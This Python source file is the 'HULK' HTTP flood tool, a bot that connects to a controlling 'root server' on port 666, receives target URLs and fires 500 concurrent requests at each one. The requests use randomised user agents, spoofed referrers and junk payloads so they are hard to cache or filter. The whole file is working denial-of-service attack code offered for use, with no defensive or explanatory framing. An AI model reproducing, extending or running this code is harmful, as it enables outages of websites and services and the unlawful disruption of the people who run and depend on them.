import sys
import re
import asyncio
import aiohttp
import random
import string
import socket
import time


class Missile():
    def __init__(self, root, url, loop):
        self.root = root
        self.url = self.base_url = url
        if self.url.count("/") == 2:
            self.url += "/"
        m = re.search('http[s]?\://([^/]*)/?.*', self.url)
        self.host = m.group(1)
        url_fmt = self.url.rstrip('/')
        if self.url.count("?") > 0:          # For Quering type urls
            param_joiner = "&"
        else:
            param_joiner = "?"
        self.url = f"{url_fmt}{param_joiner}"
        self.sess = aiohttp.ClientSession(
            loop=loop,
            connector=aiohttp.TCPConnector(limit=0)
        )
        self.ua_list = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
            'Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
            'Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
            'AppleWebKit/532.1 (KHTML, like Gecko)'
            'Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
            'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
            'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
            '.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
            'Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
            'SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]
        self.referrer_list = [
            'https://www.google.com/?q=',
            'https://www.usatoday.com/search/results?q=',
            'https://engadget.search.aol.com/search?q=',
            'https://cloudfare.com',
            'https://github.com',
            'https://en.wikipedia.org',
            'https://youtu.be',
            'https://mozilla.org',
            'https://microsoft.com',
            'https://wordpress.org'
        ]
        if self.host:
            self.referrer_list.append(f'https://{self.host}/')
        self.headers = {
            'Cache-Control': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;'
            'q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Content-Encoding': 'deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Keep-Alive': str(random.randint(110, 120)),
            'Host': self.host
        }
        self.method = self.sess.post
        self.count = 0

    @staticmethod
    def generate_junk(size):
        return ''.join(
            random.choices(
                string.ascii_letters + string.digits,
                k=random.randint(3, size)
            )
        )

    async def _launch(self):
        try:
            self.count += 1
        except AttributeError:
            return -2
        print(
            f"Launching attack no. {self.count} on {self.url.split('?')[0]}."
        )
        junk_1 = self.generate_junk(random.randint(3, 10))
        junk_2 = self.generate_junk(random.randint(3, 10))
        target = f"{self.url}{junk_1}={junk_2}"
        headers = {**self.headers}
        headers.update({
            'User-Agent': random.choice(self.ua_list),
            'Referer': f"{random.choice(self.referrer_list)}",
        })
        payload = {
            self.generate_junk(
                random.randint(5, 10)
            ): self.generate_junk(
                random.randint(500, 1000)
            )
        }
        try:
            async with self.method(
                url=target,
                headers=headers,
                json=payload
            ) as resp:
                status = resp.status
                reason = resp.reason
                if any([
                    # ToDo: Add a list of anti-DDoS servers
                    resp.headers.get('server').lower() == "cloudfare",
                    status == 400
                ]):
                    print('Url has DDoS protection.')
                elif status == 404:
                    print(target)
                    print('\nUrl not found. Please retry with another url.')
                elif status == 405:
                    self.method = self.sess.get
                elif status == 429:
                    print('Too many requests detected. Slowing down a bit.')
                    await asyncio.sleep(random.uniform(5.0, 7.5))
                elif status >= 500:
                    print(f"Successfully DoSed {self.base_url}!")
                elif status < 400:
                    pass
                else:
                    print(f"Unknown status code detected.\n{status}\n{reason}")
            return status
        except aiohttp.client_exceptions.ClientConnectorError as e:
            print(str(e))
            return -1

    async def attack(self, count):
        tasks = [
            asyncio.create_task(self._launch())
            for i in range(count)
        ]
        status_list = list(set(await asyncio.gather(*tasks)))
        if status_list == [-2]:
            return -2
        if all([
            status < 500
            for status in status_list
        ]):
            print(
                f"Finished Performing {self.count} attacks "
                "but the target is still intact..."
            )
        try:
            self.root.sendall(str(status_list).encode())
            return 0
        except (
            ConnectionRefusedError,
            ConnectionAbortedError,
            ConnectionError
        ):
            await self.sess.close()
            return -1

if __name__ == "__main__":
    async def main(root, url):
        print(f"\nPerforming DDoS Attack on {url}.\n")
        loop = asyncio.get_event_loop()
        missile = Missile(root=root, url=url, loop=loop)
        root_status = await missile.attack(500)
        return root_status
    def bordered(text):
        sentences = text.splitlines()
        hor = max(len(line) for line in sentences) + 2
        pad = ['┌' + '─' * hor + '┐']
        for line in sentences:
            pad.append('│ ' + (line + ' ' * hor)[:hor - 1] + '│')
        pad.append('└' + '─' * hor + '┘')
        return '\n'.join(pad)

    def get_server():
        root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        root_ip = "localhost"
        if len(sys.argv) > 1:
            root_ip = sys.argv[1]
        print("Trying to establish connection with Root server.")
        while True:  # Persistent Connection
            try:
                root.connect((root_ip, 666))
                print(f"Connected to {root_ip}:{666}!")
                return root
            except (
                ConnectionRefusedError,
                ConnectionAbortedError,
                ConnectionError
            ):
                continue

    if "help" in [arg.lower() for arg in sys.argv]:
        print(
            bordered(
                'USAGE: python hulk.py <root_server-IP>\n\n'
                'Example: python hulk.py localhost\n'
            )
        )
        sys.exit(0)

    print(
        bordered(
            "-- HULK Attack Started --\n\n"
            "Current Version: 3.0\n\n"
            "Compatible with: Python 3.7\n\n"
            "Author: Hyperclaw79\n"
        )
    )

    root = get_server()
    root.sendall("Requesting Target.".encode())
    while True:
        command = root.recv(1024)  # Target
        target = command.decode()
        if target.lower() == "stop":
            root.sendall("Disconnecting".encode())
            root.close()
            sys.exit(0)
        root_status = asyncio.run(main(root, target))
        if root_status == -1:
            print("Root server is down. Quiting.")
            sys.exit(0)
        elif root_status == -2:
            print(
                "Received an invalid url from Server.\n"
                "Notified server and rebooting in 2 minutes.\n"
            )
            time.sleep(120)
            root = get_server()
            root.sendall("Requesting Target.".encode())
